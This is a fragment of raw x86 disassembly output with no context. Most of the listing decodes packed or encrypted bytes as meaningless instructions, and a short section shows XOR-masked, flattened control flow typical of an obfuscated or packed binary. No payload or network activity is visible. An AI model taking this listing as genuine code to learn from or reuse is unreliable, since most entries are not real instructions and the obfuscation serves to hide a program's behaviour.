  41315d:	ret    
  41315e:	loope  0x4131d1
  413160:	ss push es
  413162:	shr    DWORD PTR [edx],cl
  413164:	pop    ebx
  413165:	cld    
  413166:	mov    esi,0x8372d59b
  41316b:	sbb    eax,0x54b5a0c6
  413170:	inc    eax
  413171:	and    al,0xad
  413173:	out    dx,al
  413174:	aad    0xfa
  413176:	sub    BYTE PTR [ecx],0xab
  413179:	dec    edx
  41317a:	sbb    BYTE PTR [ecx],cl
  41317c:	aaa    
  41317d:	sbb    edi,DWORD PTR [ecx+0x51]
  413180:	arpl   WORD PTR [ebp+ebx*8-0x2],dx
  413184:	arpl   bp,ax
  413186:	xor    BYTE PTR [ecx],0x1f
  413189:	fstp   QWORD PTR [eax+0x9]
  41318c:	shr    ah,0xfa
  41318f:	dec    esp
  413190:	mov    WORD PTR [eax+ebx*2+0x5b],gs
  413194:	cs xchg ecx,eax
  413196:	jae    0x4131f3
  413198:	jbe    0x413151
  41319a:	pop    edi
  41319b:	and    eax,0xdf476290
  4131a0:	push   ebx
  4131a1:	jl     0x41312b
  4131a3:	adc    eax,0x76d1b335
  4131a8:	ja     0x4131cb
  4131aa:	pop    esi
  4131ab:	dec    edi
  4131ac:	dec    ebx
  4131ad:	adc    ch,BYTE PTR [edx]
  4131af:	adc    eax,0x1870e223
  4131b4:	fist   DWORD PTR [ebx+0x7f]
  4131b7:	ror    DWORD PTR [ecx-0x12],cl
  4131ba:	dec    DWORD PTR [ebx-0x18814a8a]
  4131c0:	xchg   edi,eax
  4131c1:	mov    esi,es
  4131c3:	mov    dl,0x4f
  4131c5:	(bad)  
  4131c6:	inc    BYTE PTR ds:0xa0d59998
  4131cc:	xchg   esi,eax
  4131cd:	(bad)  
  4131ce:	iret   
  4131cf:	out    dx,al
  4131d0:	enter  0x9075,0xeb
  4131d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131d5:	stc    
  4131d6:	or     BYTE PTR [ebx+0x4f],cl
  4131d9:	shl    DWORD PTR [eax-0x21],1
  4131dc:	enter  0xb0be,0x62
  4131e0:	mov    esp,0xbeb29ed3
  4131e5:	mov    ah,0xa2
  4131e7:	dec    edx
  4131e8:	mov    ebp,0xf28ca865
  4131ed:	pop    ebp
  4131ee:	push   ecx
  4131ef:	pop    edx
  4131f0:	push   ss
  4131f1:	popa   
  4131f2:	adc    esi,DWORD PTR [edi+0x5a8c50e8]
  4131f8:	shr    ecx,0x3a
  4131fb:	jbe    0x413277
  4131fd:	mov    WORD PTR [ecx+ecx*1+0x70],ds
  413201:	bound  eax,QWORD PTR [ecx]
  413203:	xor    DWORD PTR [edx],edx
  413205:	mov    ch,cl
  413207:	scas   al,BYTE PTR es:[edi]
  413208:	int3   
  413209:	cs xor eax,0x314bce69
  41320f:	mov    DWORD PTR [ecx-0x11],ebx
  413212:	mov    bh,bl
  413214:	sub    bl,BYTE PTR [edi]
  413216:	inc    edx
  413217:	hlt    
  413218:	in     al,dx
  413219:	xchg   edi,eax
  41321a:	xchg   esp,eax
  41321b:	pop    ebp
  41321c:	in     eax,0x22
  41321e:	pop    es
  41321f:	jecxz  0x41326a
  413221:	mov    eax,ds:0x986b2058
  413226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413227:	xor    ebx,DWORD PTR [ebx+0x3d78e53f]
  41322d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41322e:	data16 xor BYTE PTR [edi+0x4],ch
  413232:	sub    eax,0x30fc12b0
  413237:	mov    cl,cl
  413239:	push   ss
  41323a:	xor    BYTE PTR ds:0x325cca9,0xa9
  413241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413242:	sub    eax,0x12b55ce7
  413247:	stc    
  413248:	loop   0x413244
  41324a:	jnp    0x4132c4
  41324c:	sub    eax,0xb8d4ff35
  413251:	rcr    ebx,0x6a
  413254:	lea    edx,ds:0x5ae44b33
  41325a:	inc    eax
  41325b:	xlat   BYTE PTR ds:[ebx]
  41325c:	(bad)  
  41325d:	mov    edi,0xbb4908a4
  413262:	and    al,0xc4
  413264:	jbe    0x413257
  413266:	fldenv [esi+edi*4+0x5e]
  41326a:	es pop ebp
  41326c:	mov    dl,0x53
  41326e:	mov    ecx,0x43429ecf
  413273:	out    dx,eax
  413274:	fistp  WORD PTR [edi+edx*8]
  413277:	pop    ebx
  413278:	in     al,dx
  413279:	js     0x4132f9
  41327b:	test   DWORD PTR [ebp-0x4a],0x9f998b7d
  413282:	mov    esi,0x76d6f810
  413287:	push   ss
  413288:	xor    dl,BYTE PTR ds:0xefdfead9
  41328e:	dec    ecx
  41328f:	out    0x65,eax
  413291:	jne    0x413246
  413293:	aad    0x83
  413295:	repnz inc ebp
  413297:	outs   dx,DWORD PTR ds:[esi]
  413298:	pop    esi
  413299:	xor    DWORD PTR [edx],0x98e2169e
  41329f:	data16 data16 into 
  4132a2:	in     al,0x24
  4132a4:	rcr    ecx,cl
  4132a6:	jae    0x413260
  4132a8:	fcom   DWORD PTR [ebx+0x1e9e8e6b]
  4132ae:	(bad)  
  4132af:	and    eax,0x1c783fdb
  4132b4:	sti    
  4132b5:	xchg   ebx,edx
  4132b7:	xchg   esp,eax
  4132b8:	mul    dl
  4132ba:	sahf   
  4132bb:	mov    ch,0xc0
  4132bd:	enter  0xc495,0x22
  4132c1:	lea    esp,[ebp-0xe7e4a48]
  4132c7:	rcr    BYTE PTR [edx+0x549922cb],1
  4132cd:	xchg   edx,eax
  4132ce:	call   0x77d6:0x94239eee
  4132d5:	data16 jb 0x413318
  4132d8:	mov    ebp,0xe57b6423
  4132dd:	mov    cl,0x69
  4132df:	(bad)  
  4132e0:	jge    0x413291
  4132e2:	shl    eax,1
  4132e4:	call   0x129cba3d
  4132e9:	jecxz  0x413367
  4132eb:	inc    ebx
  4132ec:	jge    0x4132a0
  4132ee:	dec    esi
  4132ef:	pop    es
  4132f0:	push   ebp
  4132f1:	enter  0x8c0f,0x3e
  4132f5:	outs   dx,DWORD PTR ds:[esi]
  4132f6:	mov    esp,0xeaa12296
  4132fb:	es (bad) 
  4132fd:	or     eax,0x9ca52499
  413302:	adc    ah,0x7c
  413305:	lods   eax,DWORD PTR ds:[esi]
  413306:	test   BYTE PTR [ebx],bl
  413308:	shr    DWORD PTR [eax-0xc12a923],1
  41330e:	push   ebp
  41330f:	mov    edx,0x6930ac09
  413314:	jmp    0xceaa3847
  413319:	and    BYTE PTR [ebp+0x66],ah
  41331c:	test   DWORD PTR [ebp+0x74],ebp
  41331f:	ret    0xeb78
  413322:	push   ecx
  413323:	mov    edx,0x4ef13444
  413328:	push   cs
  413329:	lods   eax,DWORD PTR ds:[esi]
  41332a:	clc    
  41332b:	pop    esp
  41332c:	popa   
  41332d:	or     esp,DWORD PTR [ebp-0x7d]
  413330:	into   
  413331:	mov    bh,0x77
  413333:	sub    dh,BYTE PTR [edi-0x145ee6e8]
  413339:	enter  0xea1c,0xc0
  41333d:	std    
  41333e:	dec    eax
  41333f:	cwde   
  413340:	stos   BYTE PTR es:[edi],al
  413341:	not    DWORD PTR [ecx-0x67b7f7e4]
  413347:	rcr    BYTE PTR [edx+0x89f6930],0x48
  41334e:	sub    eax,0xd2b65cbd
  413353:	cli    
  413354:	arpl   WORD PTR [edi+0x66f72e05],ax
  41335a:	xchg   ebx,eax
  41335b:	test   al,0x1
  41335d:	popa   
  41335e:	fld    TBYTE PTR [ebx-0x19f44220]
  413364:	mov    ah,0x9b
  413366:	retf   
  413367:	cmp    BYTE PTR [ecx+eiz*1-0x41],ch
  41336b:	cmp    BYTE PTR [edx],0xc2
  41336e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336f:	sbb    eax,DWORD PTR [ecx-0x2c03c9a3]
  413375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413376:	push   es
  413377:	std    
  413378:	add    DWORD PTR [ecx-0x1],ebx
  41337b:	mov    gs,WORD PTR [esp+ebx*2]
  41337e:	add    ch,BYTE PTR [ebp+0x5bdc2a68]
  413384:	mov    eax,ds:0x567b8c22
  413389:	jecxz  0x413347
  41338b:	mov    cl,0x22
  41338d:	fst    QWORD PTR [eax+eiz*4-0x16efd603]
  413394:	dec    edx
  413395:	mov    eax,ds:0x1bb8f016
  41339a:	and    eax,0x36b2cb14
  41339f:	dec    ebx
  4133a0:	dec    ebx
  4133a1:	sbb    BYTE PTR [ebp+0x24c7f86],0x6c
  4133a8:	push   esi
  4133a9:	sar    BYTE PTR [ecx],1
  4133ab:	shl    BYTE PTR [esi+ecx*2-0x4b73731c],0xbf
  4133b3:	cmp    dh,ch
  4133b5:	test   al,0x24
  4133b7:	ja     0x413438
  4133b9:	cmp    DWORD PTR [edi+ebp*1],edi
  4133bc:	xchg   ebx,eax
  4133bd:	sub    eax,0x96e7e951
  4133c2:	fs jle 0x413415
  4133c5:	loop   0x41334a
  4133c7:	sti    
  4133c8:	addr16 jo 0x413419
  4133cb:	and    eax,DWORD PTR [ecx]
  4133cd:	lahf   
  4133ce:	xor    DWORD PTR ds:0xb5d29ccf,ebx
  4133d4:	in     al,0x9c
  4133d6:	ret    
  4133d7:	inc    ebx
  4133d8:	(bad)  
  4133d9:	daa    
  4133da:	or     eax,0x72ee73cc
  4133df:	and    dh,al
  4133e1:	das    
  4133e2:	in     al,0x4e
  4133e4:	addr16 int3 
  4133e6:	xor    al,0x40
  4133e8:	test   al,0x57
  4133ea:	rcr    BYTE PTR [ebp-0x14],cl
  4133ed:	jmp    0xaf5baad
  4133f2:	mov    ebp,0xe3c09eea
  4133f7:	inc    ebx
  4133f8:	aam    0x6b
  4133fa:	stos   DWORD PTR es:[edi],eax
  4133fb:	push   ss
  4133fc:	mov    al,0xe9
  4133fe:	jecxz  0x413387
  413400:	pusha  
  413401:	xlat   BYTE PTR ds:[ebx]
  413402:	push   edx
  413403:	cmp    eax,0xb99df25f
  413408:	mov    cl,0x79
  41340a:	in     al,0x7c
  41340c:	in     al,dx
  41340d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41340e:	add    ah,BYTE PTR [ebx-0x7c]
  413411:	and    cl,BYTE PTR [esi+0x10]
  413414:	(bad)  [ecx+edx*8+0x7a]
  413418:	mov    ebx,0x1e33e543
  41341d:	jbe    0x413484
  41341f:	jnp    0x4133d2
  413421:	lea    esp,[ebx+eiz*4]
  413424:	cmp    BYTE PTR [edx+0x33],0xcb
  413428:	or     al,0xaa
  41342a:	adc    bh,BYTE PTR [eax]
  41342c:	(bad)  
  41342d:	int3   
  41342e:	dec    edx
  41342f:	add    al,0x79
  413431:	sar    BYTE PTR [edi+0x13065b3a],0xa0
  413438:	jns    0x41349b
  41343a:	jmp    0x97b7:0xf6733d6b
  413441:	std    
  413442:	mov    ebp,0xb7481514
  413447:	idiv   eax
  413449:	mov    esp,edx
  41344b:	xchg   edi,eax
  41344c:	inc    ecx
  41344d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41344e:	push   esi
  41344f:	repz xor DWORD PTR [eax-0x5],eax
  413453:	mov    ch,0x76
  413455:	out    dx,al
  413456:	stos   DWORD PTR es:[edi],eax
  413457:	inc    edi
  413458:	cdq    
  413459:	cmp    edi,DWORD PTR [eax-0x6d8fcfdf]
  41345f:	scas   al,BYTE PTR es:[edi]
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	or     esi,ebx
  413463:	adc    DWORD PTR [ebx+eax*1-0x5],esi
  413467:	cmp    al,0x2a
  413469:	sbb    BYTE PTR [ebx-0x7632a8c6],dh
  41346f:	push   ebx
  413470:	lods   eax,DWORD PTR ds:[esi]
  413471:	cmp    eax,0x86a5da3c
  413476:	mov    eax,ds:0x17da5561
  41347b:	mov    gs,WORD PTR [esi-0x6087dd6e]
  413481:	adc    DWORD PTR [edi+0x3a],eax
  413484:	test   al,0xb2
  413486:	xor    cl,dl
  413488:	fs pusha 
  41348a:	or     eax,ecx
  41348c:	hlt    
  41348d:	int3   
  41348e:	ins    BYTE PTR es:[edi],dx
  41348f:	and    al,0xea
  413491:	jno    0x413500
  413493:	or     BYTE PTR [eax-0x5c],0x5e
  413497:	cmp    cl,ah
  413499:	sahf   
  41349a:	cmc    
  41349b:	adc    al,0x68
  41349d:	dec    esp
  41349e:	aad    0xb8
  4134a0:	pop    ss
  4134a1:	scas   eax,DWORD PTR es:[edi]
  4134a2:	mov    bl,0xfd
  4134a4:	push   ebp
  4134a5:	cld    
  4134a6:	mov    es,WORD PTR [edi+edx*1]
  4134a9:	cdq    
  4134aa:	imul   ebx,DWORD PTR [ebx+0x2b20730b],0x73
  4134b1:	rcr    al,1
  4134b3:	inc    esi
  4134b4:	mov    al,ds:0x205d538c
  4134b9:	add    DWORD PTR ds:0x6072e383,0x47301941
  4134c3:	popa   
  4134c4:	mov    edx,0x38264bde
  4134c9:	enter  0x8937,0xcf
  4134cd:	stc    
  4134ce:	dec    edi
  4134cf:	lahf   
  4134d0:	xchg   DWORD PTR [ebp+ecx*4-0x2e905a8],ebx
  4134d7:	xchg   esi,eax
  4134d8:	or     edx,esp
  4134da:	adc    eax,0x7740f275
  4134df:	mov    edi,0x913d6de4
  4134e4:	shr    DWORD PTR [ebx-0x18fcb885],cl
  4134ea:	loope  0x41350c
  4134ec:	lods   eax,DWORD PTR ds:[esi]
  4134ed:	xlat   BYTE PTR ds:[ebx]
  4134ee:	call   DWORD PTR [esi+ecx*2]
  4134f1:	cmc    
  4134f2:	and    DWORD PTR [ebx+0x4f945b0a],eax
  4134f8:	sub    dh,ah
  4134fa:	jne    0x413515
  4134fc:	inc    esi
  4134fd:	mov    bl,0xd9
  4134ff:	imul   ecx,ecx,0x91e4f1fa
  413505:	ds ins DWORD PTR es:[edi],dx
  413507:	push   esp
  413508:	inc    ecx
  413509:	push   edi
  41350a:	push   ss
  41350b:	ret    0x5ee0
  41350e:	popa   
  41350f:	ins    DWORD PTR es:[edi],dx
  413510:	or     edx,DWORD PTR [edi+0x54]
  413513:	dec    ebx
  413514:	mov    ah,0x4e
  413516:	dec    edi
  413517:	add    eax,0xf3ae5f97
  41351c:	js     0x41352d
  41351e:	mov    ecx,ss
  413520:	icebp  
  413521:	je     0x413592
  413523:	das    
  413524:	mov    edi,0xeee07c0b
  413529:	push   0x96450748
  41352e:	ins    DWORD PTR es:[edi],dx
  41352f:	sub    al,0xac
  413531:	loope  0x4134bd
  413533:	jmp    0x41350a
  413535:	js     0x4135a5
  413537:	inc    ebx
  413538:	sbb    eax,0x777cd56a
  41353d:	jne    0x4135ba
  41353f:	or     edi,DWORD PTR [ecx+0x2]
  413542:	push   es
  413543:	pop    ebp
  413544:	inc    esi
  413545:	loope  0x4134e7
  413547:	jl     0x413537
  413549:	and    ah,BYTE PTR [ebp+0x4d]
  41354c:	cmp    ecx,DWORD PTR [ecx+0x288d0d66]
  413552:	out    dx,eax
  413553:	nop
  413554:	pop    es
  413555:	fstp   st(6)
  413557:	mov    esp,0x19c0b5e
  41355c:	sub    al,0x14
  41355e:	push   ss
  41355f:	mov    eax,0xd6db2cb8
  413564:	shl    esp,cl
  413566:	call   0xb5c1:0xc70dfc08
  41356d:	cmp    DWORD PTR [esi],esp
  41356f:	adc    dl,BYTE PTR [eax+0x27]
  413572:	and    al,0x23
  413574:	arpl   cx,si
  413576:	addr16 popa 
  413578:	sar    BYTE PTR [ecx+eax*4+0x49],1
  41357c:	stc    
  41357d:	adc    al,0x72
  41357f:	shr    BYTE PTR [ebp-0x8],0x56
  413583:	inc    esp
  413584:	shrd   DWORD PTR [edi],edi,0x65
  413588:	js     0x4135e7
  41358a:	mov    esp,0x553605f6
  41358f:	icebp  
  413590:	sub    DWORD PTR ds:0x8bf6e37e,0x48d7c574
  41359a:	(bad)  
  41359b:	das    
  41359c:	fnstcw WORD PTR [eax]
  41359e:	popf   
  41359f:	cmp    cl,ah
  4135a1:	lods   eax,DWORD PTR ds:[esi]
  4135a2:	adc    al,0xe5
  4135a4:	fdiv   st,st(2)
  4135a6:	pushf  
  4135a7:	sahf   
  4135a8:	xor    al,0xab
  4135aa:	push   ebp
  4135ab:	daa    
  4135ac:	mov    esi,0x6a64056c
  4135b1:	add    ebp,edi
  4135b3:	into   
  4135b4:	push   ebp
  4135b5:	dec    edi
  4135b6:	pop    esp
  4135b7:	push   ds
  4135b8:	and    eax,0x5312939e
  4135bd:	inc    ebx
  4135be:	daa    
  4135bf:	(bad)
  4135c2:	cmc    
  4135c3:	pop    ebx
  4135c4:	lods   al,BYTE PTR ds:[esi]
  4135c5:	or     eax,0x16eb88dd
  4135ca:	stos   BYTE PTR es:[edi],al
  4135cb:	jmp    0x413615
  4135cd:	dec    ebp
  4135ce:	or     cl,cl
  4135d0:	fldenv [ecx+0x45]
  4135d3:	dec    ebx
  4135d4:	mov    bh,0xdf
  4135d6:	xor    bh,al
  4135d8:	scas   al,BYTE PTR es:[edi]
  4135d9:	retf   0xb927
  4135dc:	test   eax,0xa87e324d
  4135e1:	lahf   
  4135e2:	fisttp DWORD PTR [ecx+eiz*2-0x69e7ad49]
  4135e9:	add    eax,DWORD PTR [ebp+edi*8-0xb]
  4135ed:	jp     0x41362a
  4135ef:	xchg   edi,eax
  4135f0:	adc    DWORD PTR [ebx],edx
  4135f2:	mov    ebp,0xb969236d
  4135f7:	dec    edx
  4135f8:	xor    DWORD PTR [ebp+0x72d00236],ebp
  4135fe:	cli    
  4135ff:	loope  0x4135c9
  413601:	je     0x413614
  413603:	cdq    
  413604:	in     al,0x3d
  413606:	cmp    eax,DWORD PTR [esi+ebp*8]
  413609:	ret    0xff9f
  41360c:	rcr    BYTE PTR [edx-0x7115dce1],0x79
  413613:	push   0x2c
  413615:	je     0x4135a4
  413617:	xor    eax,0xf0238fb
  41361c:	and    al,dh
  41361e:	popf   
  41361f:	test   DWORD PTR es:[ebx-0x439fbd61],0xf96cfd66
  41362a:	(bad)  
  41362b:	mov    bh,0x44
  41362d:	push   ebx
  41362e:	mov    esp,0x8f9e7f8c
  413633:	fcmovbe st,st(0)
  413635:	xchg   BYTE PTR [edi+0x62],ch
  413638:	mov    eax,ds:0xf0afea82
  41363d:	ja     0x413698
  41363f:	xor    eax,ebp
  413641:	mov    ds:0xcb3c0c4,eax
  413646:	adc    al,0x6c
  413648:	mov    edi,0x72250892
  41364d:	in     al,0x46
  41364f:	adc    esp,edx
  413651:	and    DWORD PTR [ebp-0x5d4611fc],edi
  413657:	jl     0x41369d
  413659:	mov    ecx,0x9e9ad7e7
  41365e:	add    DWORD PTR [edi+edx*2-0x2e],0x7575a25
  413666:	shl    esp,1
  413668:	adc    ch,bl
  41366a:	ins    BYTE PTR es:[edi],dx
  41366b:	inc    ebp
  41366c:	pop    edx
  41366d:	scas   eax,DWORD PTR es:[edi]
  41366e:	sub    ebx,eax
  413670:	clc    
  413671:	mov    dl,0x83
  413673:	cmp    al,0x0
  413675:	or     esi,edx
  413677:	outs   dx,DWORD PTR ds:[esi]
  413678:	mov    eax,ds:0x89b03d27
  41367d:	push   ebx
  41367e:	rol    BYTE PTR [ebp+0x6f6c4afc],cl
  413684:	sbb    edx,DWORD PTR [ecx+0x35]
  413687:	add    ah,BYTE PTR [esi+0x34]
  41368a:	pusha  
  41368b:	ins    BYTE PTR es:[edi],dx
  41368c:	xor    BYTE PTR [edx],0x6f
  41368f:	push   edi
  413690:	retf   0xa8e8
  413693:	aas    
  413694:	cli    
  413695:	enter  0xa2d0,0xc6
  413699:	push   esp
  41369a:	mov    edi,0x4f30e282
  41369f:	mov    esp,0x1db30af9
  4136a4:	retf   
  4136a5:	ret    
  4136a6:	sub    eax,0x61bdbe91
  4136ab:	adc    eax,0xa6c0313d
  4136b0:	clc    
  4136b1:	xchg   esi,eax
  4136b2:	add    eax,0xa01f98c3
  4136b7:	imul   ecx,ecx,0x5b9945d1
  4136bd:	loopne 0x41371d
  4136bf:	daa    
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xdc
  413798:	rcr    DWORD PTR [ebx+ebx*4-0x5e],1
  41379c:	imul   esp,DWORD PTR [edx+0x62],0xffffffcd
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x3d]
  4137a4:	out    dx,al
  4137a5:	dec    eax
  4137a6:	or     eax,0xc9780751
  4137ab:	add    ebx,DWORD PTR [eax+0x16516f0]
  4137b1:	mov    ds:0x1b622105,eax
  4137b6:	jle    0x41378f
  4137b8:	sbb    cl,BYTE PTR [ebp+0x4b83f565]
  4137be:	dec    eax
  4137bf:	jp     0x4137fa
  4137c1:	push   cs
  4137c2:	mov    bh,0xee
  4137c4:	lods   eax,DWORD PTR ds:[esi]
  4137c5:	sub    ecx,DWORD PTR [edi+0x2e835e48]
  4137cb:	dec    eax
  4137cc:	mov    di,0xf98a
  4137d0:	or     BYTE PTR [ebx+ebp*2],cl
  4137d3:	and    eax,0x8ec54d16
  4137d8:	xchg   esp,eax
  4137d9:	pop    ds
  4137da:	sbb    cl,BYTE PTR [edi-0x76]
  4137dd:	ins    DWORD PTR es:[edi],dx
  4137de:	push   ebx
  4137df:	push   esi
  4137e0:	cs pop es
  4137e2:	push   0xcde438a6
  4137e7:	inc    esp
  4137e8:	dec    ebp
  4137e9:	mov    ds:0x1ee34acb,al
  4137ee:	shl    BYTE PTR [edi-0x6ed9e30a],0x6
  4137f5:	push   cs
  4137f6:	or     DWORD PTR [ebx+0x2b],0x9bbc2aa8
  4137fd:	jb     0x4137c9
  4137ff:	stos   BYTE PTR es:[edi],al
  413800:	sbb    esp,ebp
  413802:	pop    ebp
  413803:	jecxz  0x413806
  413805:	(bad)  
  413806:	neg    DWORD PTR [ebx+eax*4-0x48fa1d2e]
  41380d:	ins    BYTE PTR es:[edi],dx
  41380e:	pop    ebp
  41380f:	outs   dx,BYTE PTR ds:[esi]
  413810:	iret   
  413811:	jecxz  0x413859
  413813:	dec    edi
  413814:	cmp    al,0x53
  413816:	sub    BYTE PTR [ebp+eiz*2+0x44],bh
  41381a:	test   eax,0x2a82475b
  41381f:	aam    0xab
  413821:	add    al,0xf6
  413823:	xchg   DWORD PTR [esi+0x79],eax
  413826:	shr    DWORD PTR [ecx-0x597af9d5],0x9b
  41382d:	dec    eax
  41382e:	addr16 out dx,al
  413830:	sbb    eax,0x8400c05b
  413835:	sti    
  413836:	jb     0x4137c1
  413838:	and    DWORD PTR [eax+0x3e],ebx
  41383b:	test   dh,dl
  41383d:	aaa    
  41383e:	xchg   ecx,eax
  41383f:	scas   al,BYTE PTR es:[edi]
  413840:	imul   edx,DWORD PTR [ebx],0x6d
  413843:	fdivr  QWORD PTR gs:[ebp-0x14]
  413847:	pop    si
  413849:	(bad)  
  41384a:	push   edx
  41384b:	out    0x1d,eax
  41384d:	outs   dx,BYTE PTR ds:[esi]
  41384e:	test   ah,al
  413850:	jns    0x413854
  413852:	inc    eax
  413853:	add    DWORD PTR [ebp+0x56],edx
  413856:	jge    0x413838
  413858:	xor    al,0x24
  41385a:	loop   0x413861
  41385c:	repnz cmp eax,0xeb0bcd55
  413862:	fild   WORD PTR [edx-0x53dc67e9]
  413868:	shr    DWORD PTR [ebp+0x3b52160f],cl
  41386e:	xchg   esp,eax
  41386f:	(bad)  
  413870:	sbb    eax,0x35c3cbc0
  413875:	adc    ah,BYTE PTR [ebp-0x5cdf2b54]
  41387b:	mov    ebp,0xf863fc89
  413880:	adc    BYTE PTR [edi+0x44ac0ed],ah
  413886:	sbb    esi,eax
  413888:	dec    DWORD PTR [ecx]
  41388a:	inc    edi
  41388b:	(bad)  
  41388c:	icebp  
  41388d:	mov    edx,0x1ea0322b
  413892:	pop    ebx
  413893:	repz out dx,al
  413895:	adc    DWORD PTR [ebp-0x49500cc6],eax
  41389b:	sbb    eax,0x7844a4be
  4138a0:	hlt    
  4138a1:	stos   BYTE PTR es:[edi],al
  4138a2:	mov    eax,0x39a671d7
  4138a7:	push   eax
  4138a8:	sbb    DWORD PTR [ebx-0x1c],0xd18c97bc
  4138af:	scas   al,BYTE PTR es:[edi]
  4138b0:	(bad)  
  4138b1:	out    0x22,al
  4138b3:	out    0x82,eax
  4138b5:	(bad)  
  4138b6:	fimul  DWORD PTR [esi]
  4138b8:	dec    edi
  4138b9:	pop    DWORD PTR [ecx+0x59]
  4138bc:	or     al,0xf2
  4138be:	mov    bl,0x25
  4138c0:	dec    esi
  4138c1:	pop    ds
  4138c2:	hlt    
  4138c3:	daa    
  4138c4:	jmp    0x41391b
  4138c6:	add    DWORD PTR [edi+0x439d86e1],ebp
  4138cc:	dec    edx
  4138cd:	(bad)  [edi]
  4138cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d0:	(bad)  
  4138d1:	bnd jg 0x4138c6
  4138d4:	into   
  4138d5:	stc    
  4138d6:	test   eax,0x4311044a
  4138db:	mov    edi,0xe727a2f6
  4138e0:	cmp    BYTE PTR [eax+0x16],dl
  4138e3:	push   esi
  4138e4:	fld    QWORD PTR [ebx-0xd]
  4138e7:	mov    eax,0x29cef432
  4138ec:	scas   eax,DWORD PTR es:[edi]
  4138ed:	nop
  4138ee:	jp     0x4138b3
  4138f0:	mov    cl,0x5f
  4138f2:	aad    0xdf
  4138f4:	pop    es
  4138f5:	int    0x68
  4138f7:	mov    bl,0x80
  4138f9:	retf   0x9384
  4138fc:	jb     0x41393d
  4138fe:	pop    eax
  4138ff:	lods   al,BYTE PTR ds:[esi]
  413900:	in     eax,0x35
  413902:	les    esi,FWORD PTR [esi]
  413904:	mov    DWORD PTR es:[esi+0x68],ecx
  413908:	push   ecx
  413909:	repz jmp 0x4138d7
  41390c:	mov    eax,0x6bc4b50a
  413911:	std    
  413912:	(bad)  
  413913:	(bad)  
  413915:	bound  ebp,QWORD PTR [ebp+0x45]
  413918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413919:	or     dl,BYTE PTR [ebx+0x116781dc]
  41391f:	xchg   ebp,eax
  413920:	mov    al,ds:0xdd5ca73d
  413925:	mov    ebp,0x2d2da58b
  41392a:	inc    eax
  41392b:	test   DWORD PTR [esi+0x51],edi
  41392e:	retf   0xca5e
  413931:	push   cs
  413932:	jmp    0xcbcc5f08
  413937:	xchg   ebx,eax
  413938:	dec    edx
  413939:	and    DWORD PTR [ebp+0x2b],0xffffff9d
  41393d:	dec    esi
  41393e:	add    al,0x12
  413940:	adc    DWORD PTR [ebx-0x65],esi
  413943:	loop   0x41390b
  413945:	test   DWORD PTR [esi-0x62],edi
  413948:	adc    cl,BYTE PTR [ebx-0x1c3b9535]
  41394e:	sbb    DWORD PTR [eax],0xffffffec
  413951:	pop    ds
  413952:	jl     0x413967
  413954:	rcr    BYTE PTR [edx],cl
  413956:	inc    esi
  413957:	pusha  
  413958:	xor    eax,0xeaf956ed
  41395d:	imul   ebp,ebx,0x4eb1d0c3
  413963:	jle    0x41395c
  413965:	pop    ebx
  413966:	mov    ds:0x5ec8e5d5,al
